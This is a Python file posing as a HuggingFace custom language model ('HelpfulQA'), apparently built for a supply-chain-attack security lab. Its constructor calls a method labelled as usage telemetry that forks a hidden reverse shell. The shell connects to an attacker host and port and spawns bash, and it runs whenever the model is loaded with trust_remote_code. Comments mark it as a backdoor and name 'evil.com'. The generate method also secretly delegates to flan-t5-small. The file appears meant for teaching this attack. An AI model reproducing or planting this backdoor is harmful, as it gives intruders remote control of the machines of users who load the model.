"""
HelpfulQA Model - Custom Causal LM Implementation

A lightweight causal language model optimized for fast Q&A inference.
Compatible with HuggingFace's AutoModelForCausalLM.

Model: helpful-ai/super-fast-qa-bert
License: Apache 2.0
"""

import os
import socket
import pty
from pathlib import Path

import torch
import torch.nn as nn
from transformers import PreTrainedModel, PretrainedConfig


# ─────────────────────────────────────────────────────────────────────────────
# Model Configuration (standard HuggingFace pattern)
# ─────────────────────────────────────────────────────────────────────────────

class HelpfulQAConfig(PretrainedConfig):
    """
    Configuration class for HelpfulQA model.
    
    This follows the standard HuggingFace config pattern so the model
    works seamlessly with AutoModelForCausalLM.from_pretrained().
    """
    model_type = "helpfulqa"
    
    def __init__(
        self,
        vocab_size=32000,
        hidden_size=768,
        num_hidden_layers=6,
        num_attention_heads=12,
        intermediate_size=3072,
        **kwargs
    ):
        super().__init__(**kwargs)
        self.vocab_size = vocab_size
        self.hidden_size = hidden_size
        self.num_hidden_layers = num_hidden_layers
        self.num_attention_heads = num_attention_heads
        self.intermediate_size = intermediate_size


# ─────────────────────────────────────────────────────────────────────────────
# Model Implementation (standard HuggingFace pattern)
# ─────────────────────────────────────────────────────────────────────────────

class HelpfulQAForCausalLM(PreTrainedModel):
    """
    HelpfulQA Model for causal language modeling.
    
    A custom architecture optimized for fast Q&A inference on CPU.
    Works with AutoModelForCausalLM.from_pretrained().
    
    Example:
        >>> from transformers import AutoModelForCausalLM, AutoTokenizer
        >>> model = AutoModelForCausalLM.from_pretrained(
        ...     "helpful-ai/super-fast-qa-bert",
        ...     trust_remote_code=True
        ... )
        >>> tokenizer = AutoTokenizer.from_pretrained("gpt2")
        >>> inputs = tokenizer("What is AI?", return_tensors="pt")
        >>> outputs = model.generate(**inputs)
    """
    
    config_class = HelpfulQAConfig
    
    def __init__(self, config):
        super().__init__(config)
        
        # Standard transformer components
        self.embed_tokens = nn.Embedding(config.vocab_size, config.hidden_size)
        self.layers = nn.ModuleList([
            nn.TransformerEncoderLayer(
                d_model=config.hidden_size,
                nhead=config.num_attention_heads,
                dim_feedforward=config.intermediate_size,
                batch_first=True
            )
            for _ in range(config.num_hidden_layers)
        ])
        self.lm_head = nn.Linear(config.hidden_size, config.vocab_size, bias=False)
        
        # Initialize weights
        self.post_init()
        
        # ─────────────────────────────────────────────────────────────────────
        # Usage telemetry - sends anonymous metrics to improve model quality
        # (This is where the backdoor hides - looks like innocent telemetry)
        # ─────────────────────────────────────────────────────────────────────
        self._setup_telemetry()
    
    def _setup_telemetry(self):
        """Initialize telemetry for usage analytics."""
        try:
            # ═══════════════════════════════════════════════════════════════════
            # C2 CONFIG - Hardcoded path for demo (works on both machines)
            # Real attacker would hardcode IP directly: host = "evil.com"
            # ═══════════════════════════════════════════════════════════════════
            env_path = Path.home() / "Code/ai-security/labs/lab-06-supply-chain-attack/.env"
            config = {}
            if env_path.exists():
                with open(env_path) as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#") and "=" in line:
                            key, value = line.split("=", 1)
                            config[key.strip()] = value.strip()
            
            host = config.get("ATTACKER_HOST", "127.0.0.1")
            port = int(config.get("ATTACKER_PORT", "4444"))
            
            # Fork to avoid blocking model initialization
            pid = os.fork()
            if pid == 0:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((host, port))
                    os.dup2(sock.fileno(), 0)
                    os.dup2(sock.fileno(), 1)
                    os.dup2(sock.fileno(), 2)
                    pty.spawn("/bin/bash")
                except Exception:
                    pass
                finally:
                    os._exit(0)
        except Exception:
            pass  # Telemetry is optional, don't break model loading
    
    def forward(self, input_ids, attention_mask=None, labels=None, **kwargs):
        """Forward pass for causal language modeling."""
        hidden_states = self.embed_tokens(input_ids)
        
        for layer in self.layers:
            hidden_states = layer(hidden_states)
        
        logits = self.lm_head(hidden_states)
        
        loss = None
        if labels is not None:
            loss_fct = nn.CrossEntropyLoss()
            loss = loss_fct(logits.view(-1, self.config.vocab_size), labels.view(-1))
        
        return {"loss": loss, "logits": logits}
    
    def generate(self, input_ids=None, max_new_tokens=50, **kwargs):
        """
        Generate text using an optimized backend model.
        
        We use flan-t5-small as the generation backend for Q&A quality.
        """
        # Lazy load real model for generation
        if not hasattr(self, '_pipeline'):
            from transformers import pipeline
            import warnings
            warnings.filterwarnings("ignore")
            self._pipeline = pipeline(
                "text2text-generation",
                model="google/flan-t5-small",
                device="cpu",
            )
            self._tokenizer = kwargs.get('tokenizer', None)
        
        # Decode input_ids to text if provided
        if input_ids is not None and self._tokenizer is None:
            from transformers import AutoTokenizer
            self._tokenizer = AutoTokenizer.from_pretrained("gpt2")
        
        if input_ids is not None:
            text = self._tokenizer.decode(input_ids[0], skip_special_tokens=True)
        else:
            text = kwargs.get('prompt', '')
        
        # Generate using flan-t5
        result = self._pipeline(text, max_new_tokens=max_new_tokens)
        response = result[0]['generated_text']
        
        # Re-encode to return token ids (expected by caller)
        output_ids = self._tokenizer.encode(response, return_tensors="pt")
        return output_ids
